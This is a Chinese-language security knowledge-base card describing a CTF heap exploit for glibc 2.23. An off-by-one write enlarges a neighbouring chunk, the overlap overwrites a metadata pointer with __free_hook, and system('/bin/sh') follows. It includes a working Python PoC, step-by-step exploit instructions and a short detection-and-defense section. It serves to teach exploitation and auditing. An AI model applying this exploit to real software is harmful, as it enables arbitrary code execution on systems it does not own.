---
id: binary-pwn-heap-glibc223-offbyone-size-extend-overlap-metadata-ptr-freehook
title: glibc 2.23 off-by-one 改相邻 chunk size 造重叠：覆盖 0x10 元数据块指针为 __free_hook，edit 写 system 后 free 触发
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc223-offbyone-size-extend-overlap-metadata-pointer-freehook
tags:
- pwn
- heap
- glibc223
- off-by-one
- chunk-overlap
- metadata
- free-hook
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-13'
updated: '2026-11-13'
verification:
  verified_by: verifier-V654
  verified_at: '2026-11-13T05:40:49+08:00'
  notes: 已对照原文与30图核对：题注glibc2.23、edit_user按size+1写(off-by-one)、p64(0)*3+p8(0x81)把下一块0x21改为0x81、free后add(0x70)重叠、元数据块+0存size/+8存ptr(图09)、写p64(0x10)+p64(free_hook)后edit(4)写system、delete(0)触发均与exp及截一致。已修正：泄露是重申请后读user+8(bk位置)的libc指针(不是保留fd)，原文未标该指针符号，仅给出exp偏移0x3c4b0a，卡内已不再断言main_arena+88。未验证点：PoC未本机复跑；glibc2.23为题目环境非受影响版本，未设versions；frontmatter无sources/source_url。
url: /docs/binary/pwn/heap/binary-pwn-heap-glibc223-offbyone-size-extend-overlap-metadata-ptr-freehook/
draft: false
kb_aliases:
- glibc 2.23 off by one
- chunk overlap 改元数据指针
- 元数据块 chunk 指针劫持
- free_hook system
- size+1 off-by-one
---

## 一句话结论

glibc 2.23 的菜单堆题中，`edit_user` 按 `stored_size + 1` 读取内容，多出的 1 字节落在下一块的 size 低字节，把 `0x21` 改成 `0x81`；`free` 这个被“扩大”的块后，再申请 0x70 会得到覆盖后续多个 chunk 的重叠块，从而改写某个 0x10 元数据块中保存的用户指针为 `__free_hook`；随后 `edit` 该条目把 `system` 写到 `__free_hook`，`free` 一个内容为 `/bin/sh` 的块即 getshell。

## 原理

- **程序结构**：`create_user` 为每个条目申请一个 0x10 的元数据块（`+0` 存 size，`+8` 存指向用户缓冲区的指针），再按请求大小申请用户块；`edit_user` 用元数据中的指针和 `size+1` 作为读取长度。
- **off-by-one**：`read_input(ptr, size+1)` 允许把第 `size+1` 个字节写进内存。对 `malloc(0x18)`（chunk size 0x20）而言，用户可用区 0x18 字节，下一块 size 字段正好在第 0x18 字节处；构造 `p64(0)*3 + p8(0x81)` 可把下一块 size 从 `0x21` 改为 `0x81`（`PREV_INUSE` 保持 1，size 合法），即把 0x20 的块“扩大”为 0x80。
- **Chunk Extend / Overlap**：glibc 2.23 没有 tcache，free 一个 0x80 的块会进入 unsorted/small bin；重新 `malloc(0x70)` 时按 0x80 返回同一块，但该块的真实边界已被放大，用户写入会覆盖其后的多个 chunk。
- **元数据指针劫持**：被覆盖的区域里包含后续条目的 0x10 元数据块；在正确偏移写入 `p64(0x10)+p64(free_hook)`，即把该条目的 size 改为 0x10、指针改为 `__free_hook`。之后 `edit(该条目, p64(system))` 就会把 `system` 写到 `__free_hook`。
- **触发**：先申请一个内容为 `/bin/sh\x00` 的条目并保留；把 `__free_hook` 改成 `system` 后 `free` 该块，`free` 内部调用 hook，等价于 `system("/bin/sh")`。
- **libc 泄露**：另用 unsorted bin：申请 0x88、0x18，free 0x88 后重新申请同大小，只写 8 字节覆盖 fd 位置、保留其后 bk 处的 libc 指针，`show` 读出该指针（本例 exp 减偏移 0x3c4b0a 得 libc 基址；原文未标该指针符号，偏移随 libc 而定）。

## 触发条件

- glibc 2.23（无 tcache、`__free_hook` 可用），通常是 CTF 环境。
- `edit` 的读取长度为 `stored_size + 1`（或其它形式的单字节越界），可写到下一块 size 的最低字节。
- 条目采用“元数据块 + 用户块”分离的结构，且元数据块与用户块在堆上交错可被重叠覆盖。
- 有 show/unsorted bin 可用于泄露 libc；有 delete 可触发 `free_hook`。

## 利用步骤

1. **写 `/bin/sh`**：`add(0x10, '/bin/sh\x00')` 作为后续 free 的触发块。
2. **泄 libc**：`add(0x88,'aaaa')`、`add(0x18,'aaaa')`、`delete(1)`、`add(0x88,'a'*8)`、`show(1)`，读 unsorted bin 残留的 libc 指针（bk 位置），按本例偏移 0x3c4b0a 算出 `system` 与 `__free_hook`。
3. **布置相邻块**：再申请若干 0x18 块（本例 4 个），让目标块后面跟着元数据/用户块。
4. **off-by-one 改 size**：对 0x18 块 `edit(2, p64(0)*3 + p8(0x81))`，把下一块 size 改为 0x81。
5. **free 并重叠**：`delete(3)` 释放被扩大的块；`add(0x70, p64(0)*8 + p64(0x10) + p64(free_hook))` 取回重叠块，覆盖目标元数据块为 `size=0x10, ptr=__free_hook`。
6. **写 hook 并触发**：`edit(4, p64(system))` 把 system 写到 `__free_hook`；`delete(0)` 释放 `/bin/sh` 块，调用 `system("/bin/sh")`。

## PoC

```python
# 精简关键步骤（完整脚本见原文）
add(0x10,'/bin/sh\x00')          # idx0，后续 free 触发
add(0x88,'aaaa'); add(0x18,'aaaa')
delete(1)
add(0x88,'a'*8); show(1)
libc_base = u64(p.recv(6).ljust(8,'\x00')) - 0x3c4b0a
system    = libc_base + libc.sym['system']
free_hook = libc_base + libc.sym['__free_hook']

add(0x18,''); add(0x18,''); add(0x18,''); add(0x18,'')
edit(2, p64(0)*3 + p8(0x81))     # 下一块 size 0x21 -> 0x81
delete(3)                        # free 被扩大的 0x80 块

# 重叠写：把某条目的元数据改为 ptr = __free_hook
add(0x70, p64(0)*8 + p64(0x10) + p64(free_hook))
edit(4, p64(system))             # __free_hook = system
delete(0)                        # system("/bin/sh")
```

## 变体与关联

- **扩大目标不同**：把 size 改成 0x41/0x61 等可精确覆盖 1~N 个后续 chunk；偏移要按元数据块与用户块的交错顺序计算。
- **同版本收尾变体**：也可把元数据指针改成 `__malloc_hook` 或 GOT 项；2.23 无 tcache，常配合 fastbin dup/unsorted 泄露。
- 关联卡片：[[binary-pwn-heap-chunk-extend-size-overlap-unsorted-leak-fastbin-malloc-hook]]（Chunk Extend 改 size 造重叠打 malloc_hook）、[[binary-pwn-heap-metadata-array-offbyone-chunkptr-low-byte-heap-leak]]（元数据/指针数组相邻的 off-by-one 泄露）、[[binary-pwn-heap-glibc223-unsafe-unlink-chunks-array-got-system]]（2.23 指针数组劫持）。

## 检测与防御

- **代码审计**：搜索 `read_input(ptr, size + 1)`、`read(..., size+1, ...)` 之类的长度计算；用户区可用字节数是 `chunk_size - 0x10`，不是请求 size，任何 `+1` 都会溢出到下一块。
- **结构设计**：不要把“长度 + 指针”的元数据块与用户数据块交错分配在同一可重叠区域；对指针做完整性校验（如保存副本/异或校验）。
- **加固**：升级 glibc（2.32+ safe-linking、2.34+ 移除 `__free_hook`）可抬高同类利用成本；测试阶段用 ASan/Valgrind 捕获单字节越界。
